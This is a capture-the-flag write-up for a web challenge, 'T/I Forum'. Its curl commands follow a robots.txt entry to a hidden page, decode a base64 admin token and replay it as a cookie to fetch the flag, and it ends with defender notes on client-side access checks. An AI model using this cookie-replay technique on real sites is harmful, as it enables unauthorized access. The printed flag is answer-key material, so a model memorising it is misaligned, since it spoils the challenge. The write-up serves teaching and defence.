<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/web/ti-forum -->
<!-- (full solve.py and handout/ live there) -->

# T/I Forum (web)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | web                                                            |
| URL      | `http://34.77.68.154:10201/`                                   |
| Server   | nginx/1.27.5 serving static HTML                               |
| Flag     | `HASBL{3v3n_4_B4by_C4n_Find_7h47}`                             |

## Description

> I really wonder what's written in the private topics.

Three layers, each one a different flavour of "the JavaScript is lying
to you." The forum's two "private" threads are openly served; the
admin check is entirely client-side; and the real flag sits behind a
server-side cookie equality check on `/flag.txt` whose value the page
hands out for free if you follow the `robots.txt` breadcrumb.

## TL;DR

```
$ curl -s http://34.77.68.154:10201/robots.txt
User-agent: *
Disallow: /secret_page.html

$ curl -s http://34.77.68.154:10201/secret_page.html | grep -oE '[A-Za-z0-9+/=]{20,}'
c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY=

$ echo c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY= | base64 -d
super_secret_admin_2026

$ curl -s -H 'Cookie: admin=super_secret_admin_2026' http://34.77.68.154:10201/flag.txt
HASBL{3v3n_4_B4by_C4n_Find_7h47}
```

## Recon

### Step 1 — read the source, ignore the lock icons

The homepage renders an "underground board" with a public thread
listing and an `► admin / private` section containing two locked
threads. The locks look like real gates:

```html
<a class="locked-thread is-locked" data-admin-link="private_internal.html"
   href="#" aria-disabled="true"><span>🔒</span><span>internal board — access denied</span></a>
<a class="locked-thread is-locked" data-admin-link="private_flag_distribution.html"
   href="#" aria-disabled="true"><span>🔒</span><span>flag distribution thread — admin only</span></a>
```

But the *href* is `"#"` and the real target is in `data-admin-link`,
swapped in by JavaScript only after `checkAdmin()` validates a cookie.
The files themselves are static — nginx will serve them to anyone
who asks:

```
$ for p in private_internal.html private_flag_distribution.html; do
    curl -s -o /dev/null -w "%{http_code} %s\n" http://34.77.68.154:10201/$p $p
  done
200 private_internal.html
200 private_flag_distribution.html
```

Both files load 200 OK. The thread bodies, however, are dev-jokes
("Keep internal notes tight and no flag leaks." / "No direct flag
drops in public threads. Keep it clean.") — the *private topics* are
intentional decoys. The real prize is somewhere else, and the JS
shows you where.

### Step 2 — walk the JS chain

The relevant block from `index.html` is short enough to read in one
sitting:

```js
async function getSecretPath() {
  const res = await fetch('/robots.txt');
  const text = await res.text();
  const match = text.match(/Disallow:\s*(\S+)/i);
  return match ? match[1] : '';
}

async function getAdminSecret() {
  const secretPath = await getSecretPath();
  const res = await fetch(secretPath);
  const text = await res.text();
  const doc = new DOMParser().parseFromString(text, 'text/html');
  const tokenEl = doc.getElementById('token');
  const encoded = tokenEl ? tokenEl.textContent.trim() : '';
  return encoded ? atob(encoded) : '';
}

async function checkAdmin() {
  const secret = await getAdminSecret();
  if (secret && getCookie('admin') === secret) {
    /* show admin panel, enable private threads */
    await loadFlag();  // <- fetch('/flag.txt')
  }
}
```

Three URLs, in order: `/robots.txt`, then whatever it disallows, then
`/flag.txt`. The cookie check is `===` against a value the page just
read from a public URL — so the "secret" is *the same for every
visitor* and is published as a static asset.

### Step 3 — follow the breadcrumb

```
$ curl -s http://34.77.68.154:10201/robots.txt
User-agent: *
Disallow: /secret_page.html
```

`Disallow` in `robots.txt` is a *signpost*, not a barrier. nginx
serves disallowed paths just like any other; the directive only
asks well-behaved crawlers to skip them. So:

```
$ curl -s http://34.77.68.154:10201/secret_page.html
… <div class="token-box" id="token" onclick="copyToken()">
    c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY=
  </div> …
```

The token is base64. Even without decoding, the prefix `c3VwZXJfc2Vj`
is the canonical fingerprint of an ASCII string starting with
`super_sec…`:

```
'c' = 0x63  ┐
'3' = 0x33  ├ 6-bit indices 28, 20, 5, 56, 31, 38, 5, 9, 28, 25, 37
'V' = 0x56  ┘     -> "super_sec…"
```

A `base64.b64decode` finishes it:

```python
>>> base64.b64decode("c3VwZXJfc2VjcmV0X2FkbWluXzIwMjY=")
b'super_secret_admin_2026'
```

### Step 4 — the only real gate

`/flag.txt` without the cookie behaves as if it doesn't exist:

```
$ curl -s -o /dev/null -w '%{http_code}\n' http://34.77.68.154:10201/flag.txt
404
```

With the cookie set to the decoded value, it returns the file:

```
$ curl -s -H 'Cookie: admin=super_secret_admin_2026' http://34.77.68.154:10201/flag.txt
HASBL{3v3n_4_B4by_C4n_Find_7h47}
```

This is the *only* check on the server side. The locked-thread CSS,
the JS redirect on the private pages, and the entire `login.html` flow
(localStorage-backed, no server involvement) are decoration. The
nginx config is doing something along the lines of:

```nginx
map $http_cookie $admin_ok {
    "~*admin=super_secret_admin_2026"  1;
    default                            0;
}
location = /flag.txt {
    if ($admin_ok = 0) { return 404; }
}
```

(or an equivalent `auth_request` / `set $admin` rewrite). The 404
instead of 401/403 is a small cuteness — it hides the resource's
existence from drive-by scanners but doesn't change the attack at
all.

## Flag

```
HASBL{3v3n_4_B4by_C4n_Find_7h47}
```

The flag is self-deprecating: "even a baby can find that" — the
intended takeaway is that *if your "secret" is a static value you
publish to every visitor, the gate is decoration*.

## Defender notes

* **Client-side gates are theatre.** The two `private_*.html` files,
  the `is-locked` CSS class, the `data-admin-link → href` swap, and
  the `login.html` username-reservation logic are all enforced in the
  browser. Anyone who reads the page source or curls the URLs walks
  straight past them. Treat the browser as a hostile execution
  environment — any access decision that matters has to happen on
  the server.
* **`robots.txt` is a directory listing, not a deny list.** If a
  path is in `Disallow`, that's a *hint to crawlers*; it does
  nothing about humans, and is one of the first three URLs every
  recon tool fetches. Anything sensitive enumerated there is
  effectively published. Real-world equivalent: don't `Disallow:
  /admin-panel-internal-v3/`; restrict access to it instead, and
  let crawlers stumble or not.
* **A static "secret" published to every visitor is not a secret.**
  The page's JS fetches the admin token from a URL anyone can hit,
  base64-decodes it, and compares it to a cookie. The token is the
  same for every player, every session, forever. Even the base64
  wrapping (`c3VwZXJfc2VjcmV0…`) is a giveaway in itself — anyone
  who's seen base64 of an ASCII phrase recognises the prefix. To do
  this correctly you'd need a server-side auth flow that issues a
  *per-session* token tied to a verified identity, not a global
  password handed out by the welcome page.
* **404-when-unauth-ed is mild obscurity, not a defence.** The
  nginx gate on `/flag.txt` returns 404 to anyone without the
  cookie, which keeps it off `curl /flag.txt` quick sweeps and out
  of robot indexes. But once an attacker has the cookie value
  (which the page literally hands out), the 404 vanishes. The
  distinguishing feature is `Content-Length: 33` vs. the standard
  nginx 404 page — easy to script around.
* **The decoy-thread pattern is a recurring theme.** Same family as
  the *Logo* / *Magic Numbers* forensic challenges: dev puts an
  obvious-looking "private" target (thread / COM segment / EXIF
  field) in front of the player and parks the real artifact one
  layer deeper. Players who only look at the *advertised* private
  surface (the two locked threads) walk away empty-handed; the win
  is reading the JS that *describes the gate* and then walking the
  gate's own breadcrumbs.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/ti-forum/solve.py) — argparse-driven solver. Standard-library
  only (`urllib.request`, `base64`, `re`). Fetches `/robots.txt`,
  extracts the `Disallow:` path, pulls the `#token` element out of
  that page, base64-decodes it, and re-fetches `/flag.txt` with the
  resulting `Cookie: admin=…` header. Supports `--url` for replaying
  against a different instance.
* [`handout/index.html`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/ti-forum/handout/index.html) — the public board
  page; the JS chain is in the inline `<script>` near the end.
* [`handout/robots.txt`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/ti-forum/handout/robots.txt) — two lines, the
  second of which is the breadcrumb.
* [`handout/secret_page.html`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/ti-forum/handout/secret_page.html) — the
  "403 Forbidden" page whose `#token` element carries the base64
  admin secret.
* [`handout/private_internal.html`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/ti-forum/handout/private_internal.html),
  [`handout/private_flag_distribution.html`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/ti-forum/handout/private_flag_distribution.html)
  — the two decoy threads, captured to show that the lock is
  cosmetic and the contents carry no flag.

## Requirements

Python 3.9+; standard library only.
